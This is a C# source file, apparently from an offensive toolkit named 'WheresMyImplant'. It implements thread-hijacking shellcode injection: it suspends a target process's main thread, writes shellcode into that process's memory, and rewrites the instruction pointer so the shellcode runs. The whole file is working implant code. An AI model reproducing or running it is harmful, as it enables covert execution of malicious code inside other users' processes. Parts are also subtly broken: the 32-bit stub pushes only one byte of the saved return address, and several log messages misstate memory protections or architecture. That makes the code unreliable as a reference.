using System;
using System.Diagnostics;
using System.Linq;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;

namespace WheresMyImplant
{
    class HijackThread : Base, IDisposable
    {
        private UInt32 processId = 0;
        private Byte[] shellcode = null;
        private IntPtr hProcess = IntPtr.Zero;
        private IntPtr hThread = IntPtr.Zero;

        internal HijackThread(UInt32 processId, Byte[] shellcode)
        {
            this.processId = processId;
            this.shellcode = shellcode;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Main Execution Function
        ////////////////////////////////////////////////////////////////////////////////
        internal void Execute()
        {
            if (Process.GetCurrentProcess().Id == processId)
            {
                return;
            }

            hProcess = kernel32.OpenProcess(ProcessThreadsApi.ProcessSecurityRights.PROCESS_VM_OPERATION
                | ProcessThreadsApi.ProcessSecurityRights.PROCESS_VM_WRITE
                | ProcessThreadsApi.ProcessSecurityRights.PROCESS_QUERY_INFORMATION, false, processId);
            if (IntPtr.Zero == hProcess)
            {
                Console.WriteLine("[-] OpenProcess Failed");
                return;
            }
            Console.WriteLine("[+] Recieved Process Handle: 0x{0}", hProcess.ToString("X4"));

            Int32 threadId = Process.GetProcessById((int)processId).Threads[0].Id;
            Console.WriteLine("[+] Main Thread ID: {0}", threadId);
            hThread = kernel32.OpenThread(
                ProcessThreadsApi.ThreadSecurityRights.THREAD_GET_CONTEXT |
                ProcessThreadsApi.ThreadSecurityRights.THREAD_SET_CONTEXT |
                ProcessThreadsApi.ThreadSecurityRights.THREAD_SUSPEND_RESUME,
                false,
                (UInt32)threadId);
            Console.WriteLine("[+] Recieved Thread Handle: 0x{0}", hThread.ToString("X4"));

            if (-1 == kernel32.SuspendThread(hThread))
            {
                Console.WriteLine("[-] SuspendThread Failed");
                return;
            }
            Console.WriteLine("[*] Suspended Thread");

            ////////////////////////////////////////////////////////////////////////////////
            // x64 Target Process
            ////////////////////////////////////////////////////////////////////////////////
            if (Misc.Is64BitProcess(hProcess))
            {
                Winnt.CONTEXT64 context = new Winnt.CONTEXT64();
                context.ContextFlags = Winnt.CONTEXT_FLAGS64.CONTEXT_FULL;
                if (!kernel32.GetThreadContext(hThread, ref context))
                {
                    Console.WriteLine("[-] GetThreadContext (64) Failed");
                    return;
                }
                Console.WriteLine("[*] Retrieving Thread Context");
                Console.WriteLine("[*] Original RIP: 0x{0}", context.Rip.ToString("X4"));

                System.Collections.Generic.IEnumerable<Byte> stub = new Byte[] { };
                stub = stub.Concat(shellcode);
                stub = stub.Concat(new Byte[] { 0x48, 0xb8 }); // MOV RAX...
                stub = stub.Concat(BitConverter.GetBytes(context.Rip)); // ...RIP
                stub = stub.Concat(new Byte[] { 0xff, 0xe0 }); // JMP RAX

                context.Rip = (UInt64)AllocateAndWriteMemory(stub.ToArray());
                Console.WriteLine("[+] Updated RIP: 0x{0}", context.Rip.ToString("X4"));

                if (!kernel32.SetThreadContext(hThread, ref context))
                {
                    Console.WriteLine("[-] SetThreadContext (64) Failed");
                    return;
                }

                if (!kernel32.GetThreadContext(hThread, ref context))
                {
                    Console.WriteLine("[-] GetThreadContext(2) (32) Failed");
                    return;
                }
                Console.WriteLine("[*] Checking RIP: 0x{0}", context.Rip.ToString("X4"));
            }
            ////////////////////////////////////////////////////////////////////////////////
            // x86 Target Process
            ////////////////////////////////////////////////////////////////////////////////
            else
            {
                Winnt.CONTEXT context = new Winnt.CONTEXT();
                context.ContextFlags = Winnt.CONTEXT_FLAGS.CONTEXT_ALL;
                if (!kernel32.Wow64GetThreadContext(hThread, ref context))
                {
                    Console.WriteLine("[-] GetThreadContext (32) Failed");

                    return;
                }
                Console.WriteLine("[*] Retrieving Thread Context");
                Console.WriteLine("[*] Original EIP: 0x{0}", context.Eip.ToString("X4"));

                System.Collections.Generic.IEnumerable<Byte> stub = new Byte[] { };
                stub = stub.Concat(new Byte[] { 0x68 }); // PUSH...
                stub = stub.Concat(new Byte[] { BitConverter.GetBytes(context.Eip)[0] }); // ...EIP
                stub = stub.Concat(new Byte[] { 0x60, 0x9C }); // PUSHAD PUSHFD
                stub = stub.Concat(shellcode);
                stub = stub.Concat(new Byte[] { 0x9D, 0x61, 0xC3 }); // POPFD POPAD RET

                context.Eip = (UInt32)AllocateAndWriteMemory(stub.ToArray());
                Console.WriteLine("[+] Updated EIP: 0x{0}", context.Eip.ToString("X4"));

                if (!kernel32.Wow64SetThreadContext(hThread, ref context))
                {
                    Console.WriteLine("[-] SetThreadContext (32) Failed");
                    return;

                }
                Console.WriteLine("[+] Updated Thread Context");

                if (!kernel32.Wow64GetThreadContext(hThread, ref context))
                {
                    Console.WriteLine("[-] GetThreadContext(2) (32) Failed");
                    return;
                }
                Console.WriteLine("[*] Checking EIP: 0x{0}", context.Eip.ToString("X4")); 
            }
            Console.WriteLine("[*] Resuming Thread");
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Common code between the x64 and x84 shellcode sections
        ////////////////////////////////////////////////////////////////////////////////
        private IntPtr AllocateAndWriteMemory(Byte[] buffer)
        {
            UInt32 bufferLength = (UInt32)buffer.Length;
            
            IntPtr lpBaseAddress = kernel32.VirtualAllocEx(hProcess, IntPtr.Zero, bufferLength, kernel32.MEM_COMMIT | kernel32.MEM_RESERVE, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_READWRITE);
            if (IntPtr.Zero == lpBaseAddress)
            {
                Console.WriteLine("[-] VirtualAllocEx Failed");
                return IntPtr.Zero;
            }
            Console.WriteLine("[+] Allocated {0} Bytes at 0x{1}", bufferLength, lpBaseAddress.ToString("X4"));
            Console.WriteLine("[+] Memory Protections Set to {0}", Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READWRITE);

            UInt32 lpNumberOfBytesWritten = 0;
            kernel32.WriteProcessMemory(hProcess, lpBaseAddress, buffer, bufferLength, ref lpNumberOfBytesWritten);
            if (0 == lpNumberOfBytesWritten)
            {
                Console.WriteLine("[-] WriteProcessMemory Failed");
                return IntPtr.Zero;
            }
            Console.WriteLine("[+] Wrote {0} Bytes", lpNumberOfBytesWritten);
            
            var oldProtect = Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READWRITE;
            if (!kernel32.VirtualProtectEx(hProcess, lpBaseAddress, bufferLength, Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ, ref oldProtect))
            {
                Console.WriteLine("[-] VirtualProtectEx Failed");
                return IntPtr.Zero;
            }
            Console.WriteLine("[+] Memory Protections Updated to {0}", Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ);          

            return lpBaseAddress;
        }

        public void Dispose()
        {
            kernel32.ResumeThread(hThread);

            if (IntPtr.Zero != hProcess)
            {
                kernel32.CloseHandle(hProcess);
            }

            if (IntPtr.Zero != hThread)
            {
                kernel32.CloseHandle(hThread);
            }
        }

        ~HijackThread()
        {
            Dispose();
        }
    }
}